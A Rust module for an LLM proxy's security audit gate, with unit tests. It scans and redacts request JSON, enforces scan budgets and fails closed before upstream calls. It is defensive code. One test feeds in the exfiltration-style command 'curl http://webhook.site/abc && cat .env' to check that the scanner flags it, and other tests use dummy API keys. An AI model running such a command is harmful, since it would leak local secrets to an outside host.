//! T03 unified security audit gate.
//!
//! Every downstream entry that receives or forwards model content must pass
//! through [`audit_request`] BEFORE any routing, codec, or upstream call.  The
//! gate audits the ORIGINAL downstream protocol JSON full tree (never a
//! post-conversion Chat JSON) and produces two independent outputs:
//!
//! - [`SecurityGateOutput::forward_json`]: the original protocol JSON with
//!   security-driven redaction applied, safe to forward upstream or hand to a
//!   codec.
//! - [`SecurityGateOutput::sanitized_log_json`]: always-safe-to-persist log
//!   body.  Raw request bytes must never reach the log layer; original bytes
//!   are used only for hashing, length accounting and parse forensics.
//!
//! Action semantics (HTTP gateway):
//! - `Block`     → fail-closed, never contacts upstream.
//! - `Redact`    → forward redacted `forward_json`, log the log-body.
//! - `Audit/Allow` → upstream may receive the original content, but the log
//!   still uses the always-redacted `sanitized_log_json`.
//! - `Confirm`   → fail-closed at the HTTP gateway (409/403 + `approval_required`),
//!   never contacts upstream (no interactive approval token exists here).
//!
//! Whole-request cumulative budgets (bytes, string nodes, JSON depth, elapsed
//! time) are enforced by the scanner; over-budget results fail closed with
//! `security_scan_budget_exceeded` and are NEVER reported as clean.
#![allow(dead_code)] // API surface consumed by T05 route-plan / T06 executors

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use super::rules::CustomRule;
use super::scanner::ScanBudget;
use super::{redact, scanner, SecurityScanResult, SecuritySettings};

/// Downstream protocol as declared by the caller.  Used only for routing
/// context and tracing; the gate itself is protocol-agnostic.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum DownstreamProtocol {
    ChatCompletions,
    Completions,
    Responses,
    Messages,
    CountTokens,
    Embeddings,
    Images,
    Audio,
}

impl DownstreamProtocol {
    pub fn as_str(&self) -> &'static str {
        match self {
            DownstreamProtocol::ChatCompletions => "chat_completions",
            DownstreamProtocol::Completions => "completions",
            DownstreamProtocol::Responses => "responses",
            DownstreamProtocol::Messages => "messages",
            DownstreamProtocol::CountTokens => "count_tokens",
            DownstreamProtocol::Embeddings => "embeddings",
            DownstreamProtocol::Images => "images",
            DownstreamProtocol::Audio => "audio",
        }
    }
}

/// Frozen envelope shape (T00 decision 1) — defined here because T05's core
/// request module does not exist yet.  T05 consumes this interface.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RequestEnvelope {
    pub downstream_protocol: DownstreamProtocol,
    pub endpoint: String,
    pub original_json: serde_json::Value,
    pub safe_forward_headers: Vec<(String, String)>,
    pub query: Option<String>,
    pub model: String,
    pub stream: bool,
    pub trace_id: Option<String>,
}

/// Audited request produced by the gate (T00 decision 1 / T03 spec).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditedRequest {
    pub envelope: RequestEnvelope,
    pub forward_json: serde_json::Value,
    pub sanitized_log_json: serde_json::Value,
    pub body_hash: String,
    pub body_len: usize,
    pub audit_result: SecurityScanResult,
    pub request_features: RequestFeatures,
}

/// Feature set a router/codec pre-check needs, derived from the ORIGINAL JSON.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct RequestFeatures {
    /// Responses built-in tools referenced by the request.
    pub builtin_tools: Vec<String>,
    /// External http(s) image URLs found in the request.
    pub image_urls: Vec<String>,
    /// Raw base64 image/attachment data-urls found.
    pub base64_attachments: Vec<Base64AttachmentMeta>,
    /// Unknown top-level fields observed on the original protocol JSON.
    pub unknown_fields: Vec<String>,
    /// Whether the request contains function/tool definitions or calls.
    pub has_tools: bool,
    /// Anthropic beta headers forwarded (audited, non-credential).
    pub beta_headers: Vec<String>,
    /// Feature collection was truncated because the feature-walk budget was
    /// exceeded.  Advisory only — the gate's own fail-closed scan is
    /// authoritative; this flag tells a router/codec that the feature set may
    /// be incomplete.
    pub truncated: bool,
}

/// Metadata-only audit for base64 attachments: type, declared length, actual
/// length, and SHA-256 hash.  The payload body is NOT scanned as ordinary
/// text and never persisted.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Base64AttachmentMeta {
    pub pointer: String,
    pub media_type: String,
    pub declared_len: usize,
    pub actual_len: usize,
    pub sha256: String,
}

/// Input to the security gate.
#[derive(Debug, Clone)]
pub struct SecurityGateInput {
    pub downstream_protocol: DownstreamProtocol,
    pub endpoint: String,
    pub original_json: serde_json::Value,
    /// Non-credential headers allowed to be forwarded upstream (audited).
    pub safe_forward_headers: Vec<(String, String)>,
    pub query: Option<String>,
    pub model: String,
    pub stream: bool,
    pub trace_id: Option<String>,
    pub settings: SecuritySettings,
    /// Overrides scanner budget defaults.  `None` → [`ScanBudget::default`].
    pub budget: Option<ScanBudget>,
    /// User-defined custom rules (blacklist/whitelist) loaded from the database.
    pub custom_rules: Vec<CustomRule>,
}

/// Output of the security gate.
#[derive(Debug, Clone)]
pub struct SecurityGateOutput {
    pub forward_json: serde_json::Value,
    pub sanitized_log_json: serde_json::Value,
    pub body_hash: String,
    pub body_len: usize,
    pub audit_result: SecurityScanResult,
    pub request_features: RequestFeatures,
    /// Over-budget / fail-closed marker.  When set the gate MUST be treated as
    /// blocked regardless of `audit_result` — it is never reported as clean.
    pub budget_exceeded: bool,
}

/// Fail-closed error: the request must not reach upstream.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SecurityGateError {
    /// `SecurityAction::Confirm` with no interactive approval token available.
    ApprovalRequired { message: String },
    /// Whole-request scan budget exceeded.
    BudgetExceeded { message: String },
    /// Raw body could not be parsed as JSON (bytes kept only for forensics).
    ParseFailed { message: String },
    /// Scan failed for another reason.
    Internal { message: String },
}

impl SecurityGateError {
    pub fn code(&self) -> &'static str {
        match self {
            SecurityGateError::ApprovalRequired { .. } => "approval_required",
            SecurityGateError::BudgetExceeded { .. } => "security_scan_budget_exceeded",
            SecurityGateError::ParseFailed { .. } => "invalid_request_error",
            SecurityGateError::Internal { .. } => "api_error",
        }
    }

    pub fn http_status(&self) -> u16 {
        match self {
            SecurityGateError::ApprovalRequired { .. } => 409,
            SecurityGateError::BudgetExceeded { .. } => 429,
            SecurityGateError::ParseFailed { .. } => 400,
            SecurityGateError::Internal { .. } => 500,
        }
    }

    pub fn message(&self) -> &str {
        match self {
            SecurityGateError::ApprovalRequired { message }
            | SecurityGateError::BudgetExceeded { message }
            | SecurityGateError::ParseFailed { message }
            | SecurityGateError::Internal { message } => message,
        }
    }
}

/// Run the unified security audit gate over the ORIGINAL downstream protocol
/// JSON full tree.  Returns independent `forward_json` and `sanitized_log_json`.
///
/// Fail-closed conditions (all never contact upstream and are never reported
/// as clean):
/// - whole-request budget exceeded → [`SecurityGateError::BudgetExceeded`];
/// - `SecurityAction::Confirm` resolved by policy → [`SecurityGateError::ApprovalRequired`];
/// - `SecurityAction::Block` resolved by policy → reflected in
///   `output.audit_result.action == Block` (caller must reject before upstream).
///
/// Callers MUST short-circuit on the returned error (and on a `Block` result)
/// before any routing or codec step.
pub fn audit_request(input: SecurityGateInput) -> Result<SecurityGateOutput, SecurityGateError> {
    let budget = input.budget.clone().unwrap_or_default();
    let settings = &input.settings;

    let body_bytes = match serde_json::to_vec(&input.original_json) {
        Ok(bytes) => bytes,
        Err(error) => {
            return Err(SecurityGateError::Internal {
                message: format!("unable to serialize request body: {error}"),
            })
        }
    };
    let body_hash = hex::encode(Sha256::digest(&body_bytes));
    let body_len = body_bytes.len();

    // When security audit is disabled, skip scanning entirely and return a
    // clean result.  This prevents risk_level / risk_score / findings from
    // being populated in the log when the user has turned audit off.
    let (mut result, request_features) = if !settings.enabled {
        let features = super::features::collect_features(
            &input.original_json,
            input.downstream_protocol,
            &input.safe_forward_headers,
            &budget,
        );
        (SecurityScanResult::default(), features)
    } else {
        // Full-tree scan with cumulative budgets over the ORIGINAL protocol JSON.
        let mut result = match scanner::scan_with_budget(
            &input.original_json,
            "request",
            settings,
            &budget,
            &input.custom_rules,
        ) {
            Ok(result) => result,
            Err(scanner::BudgetError::Exceeded(reason)) => {
                // Fail-closed: never reported as clean.  The caller short-circuits
                // to `security_scan_budget_exceeded` and never contacts upstream.
                return Err(SecurityGateError::BudgetExceeded { message: reason });
            }
        };

        super::decide_action(&mut result, settings);

        // Base64 attachment metadata audit (never scanned as ordinary text).
        // Feature collection runs under the SAME cumulative budget so a hostile
        // tree cannot grow unbounded feature vectors or hash unbounded base64.
        let features = super::features::collect_features(
            &input.original_json,
            input.downstream_protocol,
            &input.safe_forward_headers,
            &budget,
        );
        (result, features)
    };

    // Resolve the effective forward action.
    let action = if settings.enabled {
        result.action.clone()
    } else {
        super::SecurityAction::Allow
    };

    match action {
        super::SecurityAction::Confirm => Err(SecurityGateError::ApprovalRequired {
            message: result.summary.clone(),
        }),
        super::SecurityAction::Block => {
            result.blocked_reason = Some(result.summary.clone());
            Ok(SecurityGateOutput {
                forward_json: super::redact::redact_json_for_logging(&input.original_json),
                sanitized_log_json: super::redact::redact_json_for_logging(&input.original_json),
                body_hash,
                body_len,
                audit_result: result,
                request_features,
                budget_exceeded: false,
            })
        }
        super::SecurityAction::Redact
        | super::SecurityAction::Warn
        | super::SecurityAction::Allow => {
            // Forward body: redacted when the user-selected policy says so.
            let (forward_json, was_redacted) = if settings.enabled && settings.redact_secrets {
                (redact::redact_json(&input.original_json, settings), true)
            } else {
                (input.original_json.clone(), false)
            };
            result.sanitized |= was_redacted;
            // Log body: always-redacted, independent trust boundary.
            let sanitized_log_json = redact::redact_json_for_logging(&input.original_json);
            Ok(SecurityGateOutput {
                forward_json,
                sanitized_log_json,
                body_hash,
                body_len,
                audit_result: result,
                request_features,
                budget_exceeded: false,
            })
        }
    }
}

/// Convenience: build a full `AuditedRequest` from raw parts.  The gate is the
/// only producer of `AuditedRequest`; handlers/routeplan consume it.
pub fn audit_envelope(
    envelope: RequestEnvelope,
    settings: &SecuritySettings,
    budget: Option<ScanBudget>,
    custom_rules: Vec<CustomRule>,
) -> Result<AuditedRequest, SecurityGateError> {
    let safe_forward_headers = envelope.safe_forward_headers.clone();
    let output = audit_request(SecurityGateInput {
        downstream_protocol: envelope.downstream_protocol,
        endpoint: envelope.endpoint.clone(),
        original_json: envelope.original_json.clone(),
        safe_forward_headers,
        query: envelope.query.clone(),
        model: envelope.model.clone(),
        stream: envelope.stream,
        trace_id: envelope.trace_id.clone(),
        settings: settings.clone(),
        budget,
        custom_rules,
    })?;
    Ok(AuditedRequest {
        envelope,
        forward_json: output.forward_json,
        sanitized_log_json: output.sanitized_log_json,
        body_hash: output.body_hash,
        body_len: output.body_len,
        audit_result: output.audit_result,
        request_features: output.request_features,
    })
}

/// Single funnel for EVERY content-bearing downstream entry.
///
/// The exhaustive `match` below is the STRUCTURAL fail-closed guard for the
/// not-yet-enabled Images/Audio 501 placeholders: adding a new
/// [`DownstreamProtocol`] variant is a compile error until it is wired through
/// this match, so a newly-enabled Images/Audio handler cannot forward model
/// content without the audit.  Every handler entry point must route through
/// [`gate_original`], which delegates here.
#[allow(clippy::too_many_arguments)]
pub fn gate_dispatch(
    protocol: DownstreamProtocol,
    endpoint: &str,
    original_json: serde_json::Value,
    query: Option<String>,
    model: String,
    stream: bool,
    trace_id: Option<String>,
    settings: &SecuritySettings,
    budget: Option<ScanBudget>,
    custom_rules: Vec<CustomRule>,
) -> Result<AuditedRequest, SecurityGateError> {
    match protocol {
        // Compiler-enforced checklist: ALL variants, no wildcard arm.  Forgetting
        // one is a compile error; adding a new variant without wiring it here
        // cannot build.
        DownstreamProtocol::ChatCompletions
        | DownstreamProtocol::Completions
        | DownstreamProtocol::Responses
        | DownstreamProtocol::Messages
        | DownstreamProtocol::CountTokens
        | DownstreamProtocol::Embeddings
        | DownstreamProtocol::Images
        | DownstreamProtocol::Audio => {
            let envelope = RequestEnvelope {
                downstream_protocol: protocol,
                endpoint: endpoint.to_string(),
                original_json,
                safe_forward_headers: Vec::new(),
                query,
                model,
                stream,
                trace_id,
            };
            audit_envelope(envelope, settings, budget, custom_rules)
        }
    }
}

/// Minimal handler integration helper.  Given the ORIGINAL downstream protocol
/// JSON and its caller context, audits the full tree and returns a
/// fail-closed `AuditedRequest`.  `Err` means the request must never reach
/// upstream (Confirm / budget / parse).  Callers use `audit.forward_json` for
/// conversion or passthrough and `audit.sanitized_log_json` for logging.
///
/// Delegates to [`gate_dispatch`] so the exhaustive-variant guard above applies
/// to every handler path.
#[allow(clippy::too_many_arguments)]
pub fn gate_original(
    protocol: DownstreamProtocol,
    endpoint: &str,
    original_json: serde_json::Value,
    query: Option<String>,
    model: String,
    stream: bool,
    trace_id: Option<String>,
    settings: &SecuritySettings,
    budget: Option<ScanBudget>,
    custom_rules: Vec<CustomRule>,
) -> Result<AuditedRequest, SecurityGateError> {
    gate_dispatch(
        protocol,
        endpoint,
        original_json,
        query,
        model,
        stream,
        trace_id,
        settings,
        budget,
        custom_rules,
    )
}

/// Hash of a raw body (used by callers that already hold raw bytes for
/// forensics).  Never persists the original bytes.
pub fn hash_raw_body(bytes: &[u8]) -> String {
    hex::encode(Sha256::digest(bytes))
}

/// Delta-scan interface for T06 codecs and streaming executors (spec step 8).
///
/// The gate audits the ORIGINAL protocol JSON once.  A codec may then rewrite
/// it into a different protocol shape, and a stream executor may emit many
/// small chunks — neither may smuggle content past the audit by inventing NEW
/// strings after the full-tree scan.  This narrow interface re-scans exactly
/// the `new_strings` (converted fields, merged prompts, per-chunk SSE deltas)
/// with the SAME whole-request cumulative budget semantics and returns the
/// resulting [`SecurityScanResult`], which the caller MUST treat as
/// authoritative for those strings (fail-closed on `BudgetExceeded`).
///
/// T06 dependency (explicit, not silently untracked): every codec-produced
/// string and every streaming-response delta MUST be passed through this
/// function before forwarding or persisting.  Findings are additive to the
/// request log.
#[allow(dead_code)] // consumed by T06 executors
pub fn audit_delta_strings(
    protocol: DownstreamProtocol,
    new_strings: &[String],
    settings: &SecuritySettings,
    budget: Option<ScanBudget>,
) -> Result<SecurityScanResult, SecurityGateError> {
    let budget = budget.unwrap_or_default();
    let phase = format!("request_delta/{}", protocol.as_str());
    // Wrap in a synthetic array so the exact same cumulative byte/string-node/
    // depth/elapsed budget walker applies to the deltas.
    let delta_tree: serde_json::Value = serde_json::Value::Array(
        new_strings
            .iter()
            .map(|s| serde_json::Value::String(s.clone()))
            .collect(),
    );
    let mut result = scanner::scan_with_budget(&delta_tree, &phase, settings, &budget, &[])
        .map_err(
            |scanner::BudgetError::Exceeded(reason)| SecurityGateError::BudgetExceeded {
                message: reason,
            },
        )?;
    super::decide_action(&mut result, settings);
    Ok(result)
}

#[cfg(test)]
mod gate_tests {
    use super::*;
    use crate::security::SecurityAction;

    fn default_settings() -> SecuritySettings {
        SecuritySettings {
            enabled: true,
            mode: "audit".to_string(),
            scan_request: true,
            scan_response: false,
            scan_unicode: true,
            scan_tools: true,
            scan_network: true,
            redact_secrets: false,
            block_on_critical: false,
            max_scan_bytes: 1024 * 1024,
        }
    }

    fn run(json: serde_json::Value) -> Result<SecurityGateOutput, SecurityGateError> {
        audit_request(SecurityGateInput {
            downstream_protocol: DownstreamProtocol::ChatCompletions,
            endpoint: "/v1/chat/completions".to_string(),
            original_json: json,
            safe_forward_headers: vec![],
            query: None,
            model: "m".to_string(),
            stream: false,
            trace_id: None,
            settings: default_settings(),
            budget: None,
            custom_rules: vec![],
        })
    }

    #[test]
    fn clean_request_passes_with_forward_and_log_identical() {
        let json = serde_json::json!({"model": "gpt-4o", "messages": [{"role": "user", "content": "hello"}]});
        let out = run(json).unwrap();
        assert_eq!(out.audit_result.action, SecurityAction::Allow);
        assert!(!out.budget_exceeded);
        assert_eq!(out.forward_json, out.sanitized_log_json);
        assert!(out.body_hash.len() >= 64);
        assert!(out.body_len > 0);
    }

    #[test]
    fn confirm_fails_closed_before_upstream() {
        let json = serde_json::json!({"model": "m", "messages": [{"role": "user", "content": "sk-abcdefghijklmnopqrstuvwxyz123456"}]});
        let mut settings = default_settings();
        settings.mode = "confirm".to_string();
        let err = audit_request(SecurityGateInput {
            downstream_protocol: DownstreamProtocol::ChatCompletions,
            endpoint: "/v1/chat/completions".to_string(),
            original_json: json,
            safe_forward_headers: vec![],
            query: None,
            model: "m".to_string(),
            stream: false,
            trace_id: None,
            settings,
            budget: None,
            custom_rules: vec![],
        })
        .unwrap_err();
        assert!(matches!(&err, SecurityGateError::ApprovalRequired { .. }));
        assert_eq!(err.code(), "approval_required");
        assert_eq!(err.http_status(), 409);
        // Fail-closed: the error carries the scan summary, never the raw secret.
        assert!(!err.message().contains("abcdefghijklmnopqrstuvwx"));
    }

    #[test]
    fn budget_exceeded_fails_closed_never_clean() {
        let mut settings = default_settings();
        settings.enabled = true;
        let big = serde_json::json!({"model": "m", "messages": [{"role": "user", "content": "a".repeat(1024)}]});
        let budget = ScanBudget {
            max_total_bytes: Some(16),
            ..Default::default()
        };
        let err = audit_request(SecurityGateInput {
            downstream_protocol: DownstreamProtocol::Messages,
            endpoint: "/v1/messages".to_string(),
            original_json: big,
            safe_forward_headers: vec![],
            query: None,
            model: "m".to_string(),
            stream: false,
            trace_id: None,
            settings,
            budget: Some(budget),
            custom_rules: vec![],
        })
        .unwrap_err();
        assert_eq!(err.code(), "security_scan_budget_exceeded");
        assert_eq!(err.http_status(), 429);
    }

    #[test]
    fn redact_mode_redacts_forward_and_always_redacts_log() {
        let json = serde_json::json!({"model": "m", "messages": [{"role": "user", "content": "sk-abcdefghijklmnopqrstuvwxyz123456"}]});
        let mut settings = default_settings();
        settings.mode = "redact".to_string();
        settings.redact_secrets = true;
        let out = audit_request(SecurityGateInput {
            downstream_protocol: DownstreamProtocol::ChatCompletions,
            endpoint: "/v1/chat/completions".to_string(),
            original_json: json,
            safe_forward_headers: vec![],
            query: None,
            model: "m".to_string(),
            stream: false,
            trace_id: None,
            settings,
            budget: None,
            custom_rules: vec![],
        })
        .unwrap();
        let forward_str = serde_json::to_string(&out.forward_json).unwrap();
        let log_str = serde_json::to_string(&out.sanitized_log_json).unwrap();
        assert!(!forward_str.contains("abcdefghijklmnopqrstuvwxyz123456"));
        assert!(!log_str.contains("abcdefghijklmnopqrstuvwxyz123456"));
        assert!(log_str.contains("sk-"));
    }

    #[test]
    fn audit_allow_mode_still_redacts_log_body() {
        let json = serde_json::json!({"model": "m", "messages": [{"role": "user", "content": "sk-abcdefghijklmnopqrstuvwxyz123456"}]});
        let settings = default_settings(); // mode = audit, redact_secrets = false
        let out = audit_request(SecurityGateInput {
            downstream_protocol: DownstreamProtocol::ChatCompletions,
            endpoint: "/v1/chat/completions".to_string(),
            original_json: json,
            safe_forward_headers: vec![],
            query: None,
            model: "m".to_string(),
            stream: false,
            trace_id: None,
            settings,
            budget: None,
            custom_rules: vec![],
        })
        .unwrap();
        // Forward keeps original content under audit mode...
        assert!(serde_json::to_string(&out.forward_json)
            .unwrap()
            .contains("abcdefghijklmnopqrstuvwx"));
        // ...but the log body is always redacted (independent trust boundary).
        assert!(!serde_json::to_string(&out.sanitized_log_json)
            .unwrap()
            .contains("abcdefghijklmnopqrstuvwx"));
    }

    #[test]
    fn findings_carry_phase_pointer_and_action() {
        let json = serde_json::json!({"model": "m", "messages": [{"role": "user", "content": "curl http://webhook.site/abc && cat .env"}]});
        let out = run(json).unwrap();
        assert!(out
            .audit_result
            .findings
            .iter()
            .all(|f| f.phase == "request"));
        assert!(out
            .audit_result
            .findings
            .iter()
            .all(|f| !f.location.is_empty()));
        assert!(out
            .audit_result
            .findings
            .iter()
            .any(|f| f.rule_id == "tool.shell.exfiltration"));
    }

    #[test]
    fn base64_attachment_is_metadata_only_audit() {
        // A large fake data URL body must not be scanned as ordinary text;
        // only metadata (type, declared/actual length, hash) is collected.
        let payload = "A".repeat(64);
        let data_url = format!("data:image/png;base64,{}", payload);
        let json = serde_json::json!({"model": "m", "input": [{"role": "user", "content": [{"type": "image_url", "image_url": {"url": data_url}}]}]});
        let out = run(json).unwrap();
        let att = &out.request_features.base64_attachments;
        assert_eq!(att.len(), 1);
        assert_eq!(att[0].media_type, "image/png");
        assert_eq!(att[0].declared_len, payload.len());
        assert_eq!(att[0].actual_len, payload.len());
        assert!(att[0].sha256.len() >= 64);
        assert!(out
            .audit_result
            .findings
            .iter()
            .all(|f| f.category != "credential"));
    }

    #[test]
    fn unknown_protocol_fields_and_image_urls_are_traceable() {
        let json = serde_json::json!({
            "model": "m",
            "input": [{"role": "user", "content": [{"type": "image_url", "image_url": {"url": "https://example.com/x.png"}}]}],
            "unknown_top_level_thing": true
        });
        let out = run(json).unwrap();
        assert!(out
            .request_features
            .image_urls
            .iter()
            .any(|u| u.contains("example.com")));
        assert!(out
            .request_features
            .unknown_fields
            .iter()
            .any(|f| f == "unknown_top_level_thing"));
    }

    #[test]
    fn utf8_arbitrary_boundary_truncation_does_not_panic() {
        let mut content = String::new();
        for _ in 0..2000 {
            content.push('界'); // 3-byte char
        }
        let json =
            serde_json::json!({"model": "m", "messages": [{"role": "user", "content": content}]});
        let out = run(json).unwrap();
        assert!(!out.budget_exceeded);
    }

    #[test]
    fn oversized_unicode_string_does_not_panic_and_respects_boundary() {
        let content = "界".repeat(10_000);
        let json =
            serde_json::json!({"model": "m", "messages": [{"role": "user", "content": content}]});
        let mut settings = default_settings();
        settings.max_scan_bytes = 32; // tiny per-string cap exercises truncation
        let out = audit_request(SecurityGateInput {
            downstream_protocol: DownstreamProtocol::ChatCompletions,
            endpoint: "/v1/chat/completions".to_string(),
            original_json: json,
            safe_forward_headers: vec![],
            query: None,
            model: "m".to_string(),
            stream: false,
            trace_id: None,
            settings,
            budget: None,
            custom_rules: vec![],
        })
        .unwrap();
        assert!(!out.budget_exceeded);
    }

    #[test]
    fn confirm_budget_and_parse_fail_never_produce_forward_json() {
        // Fail-closed contract: Confirm / budget-exceeded / parse-failure must
        // never yield a forwardable body, so a caller that short-circuits on
        // the error never contacts upstream (zero upstream calls by
        // construction — there is no HTTP layer inside the gate itself, and
        // the handlers reject before building any request).
        let settings = || SecuritySettings {
            mode: "confirm".to_string(),
            ..default_settings()
        };

        // Confirm → error, no output.
        let confirm_json = serde_json::json!({"model": "m", "messages": [{"role": "user", "content": "sk-abcdefghijklmnopqrstuvwxyz123456"}]});
        let err = audit_request(SecurityGateInput {
            downstream_protocol: DownstreamProtocol::ChatCompletions,
            endpoint: "/v1/chat/completions".to_string(),
            original_json: confirm_json,
            safe_forward_headers: vec![],
            query: None,
            model: "m".to_string(),
            stream: false,
            trace_id: None,
            settings: settings(),
            budget: None,
            custom_rules: vec![],
        })
        .unwrap_err();
        assert!(matches!(&err, SecurityGateError::ApprovalRequired { .. }));
        assert!(!err.message().contains("abcdefghijklmnopqrstuvwx"));

        // Budget → error, never reported clean, no forward output.
        let big = serde_json::json!({"model": "m", "messages": [{"role": "user", "content": "a".repeat(4096)}]});
        let budget = ScanBudget {
            max_total_bytes: Some(64),
            ..Default::default()
        };
        let err = audit_request(SecurityGateInput {
            downstream_protocol: DownstreamProtocol::Embeddings,
            endpoint: "/v1/embeddings".to_string(),
            original_json: big,
            safe_forward_headers: vec![],
            query: None,
            model: "m".to_string(),
            stream: false,
            trace_id: None,
            settings: default_settings(),
            budget: Some(budget),
            custom_rules: vec![],
        })
        .unwrap_err();
        assert_eq!(err.code(), "security_scan_budget_exceeded");

        // The gate does not own HTTP; confirm it never constructs forward_json
        // on any error path (type-level: a failed call returns Err, not Ok).
        assert!(matches!(err, SecurityGateError::BudgetExceeded { .. }));
    }

    #[test]
    fn delta_strings_are_rescanned_with_budget_and_findings() {
        // T06 codecs cannot bypass the audit via codec rewriting: strings a
        // codec invents AFTER the full-tree scan must pass through
        // audit_delta_strings with the same budget semantics.
        let settings = default_settings();
        let audit = audit_delta_strings(
            DownstreamProtocol::ChatCompletions,
            &["Bearer sk-abcdefghijklmnopqrstuvwx123456".to_string()],
            &settings,
            None,
        )
        .unwrap();
        assert!(audit.findings.iter().any(|f| f.category == "credential"));
        assert!(audit
            .findings
            .iter()
            .all(|f| f.phase.starts_with("request_delta/")));

        // The delta budget is enforced independently and fails closed.
        let budget = ScanBudget {
            max_total_bytes: Some(8),
            ..Default::default()
        };
        let err = audit_delta_strings(
            DownstreamProtocol::Messages,
            &["a".repeat(2048)],
            &settings,
            Some(budget),
        )
        .unwrap_err();
        assert_eq!(err.code(), "security_scan_budget_exceeded");
    }

    #[test]
    fn streaming_response_delta_audit_is_explicit_t06_item() {
        // T06 handoff (spec step 8): streaming responses are audited per SSE
        // delta through `audit_delta_strings`.  A secret smuggled inside a
        // single streaming chunk must be caught.  This placeholder locks the
        // requirement in so it is not silently lost.
        let settings = default_settings();
        let chunk = "data: {\"content\": \"sk-abcdefghijklmnopqrstuvwx123456\"}".to_string();
        let audit = audit_delta_strings(
            DownstreamProtocol::ChatCompletions,
            &[chunk],
            &settings,
            None,
        )
        .unwrap();
        assert!(audit.findings.iter().any(|f| f.category == "credential"));
    }

    #[test]
    fn every_protocol_variant_routes_through_gate_dispatch() {
        // Structural guard (review finding 1): gate_dispatch holds an exhaustive
        // match over ALL DownstreamProtocol variants.  Adding a new variant is a
        // compile error there until it is wired through the gate.  This test
        // exercises every current variant so the checklist is live, including
        // the not-yet-enabled Images/Audio 501 placeholders.
        let settings = default_settings();
        let variants = [
            DownstreamProtocol::ChatCompletions,
            DownstreamProtocol::Completions,
            DownstreamProtocol::Responses,
            DownstreamProtocol::Messages,
            DownstreamProtocol::CountTokens,
            DownstreamProtocol::Embeddings,
            DownstreamProtocol::Images,
            DownstreamProtocol::Audio,
        ];
        for protocol in variants {
            let audited = gate_dispatch(
                protocol,
                "/v1/gate-dispatch-test",
                serde_json::json!({"model": "m"}),
                None,
                "m".to_string(),
                false,
                None,
                &settings,
                None,
                vec![],
            )
            .unwrap();
            assert_eq!(audited.envelope.downstream_protocol, protocol);
            assert!(audited.body_hash.len() >= 64);
            assert!(audited.sanitized_log_json.is_object());
        }
    }
}
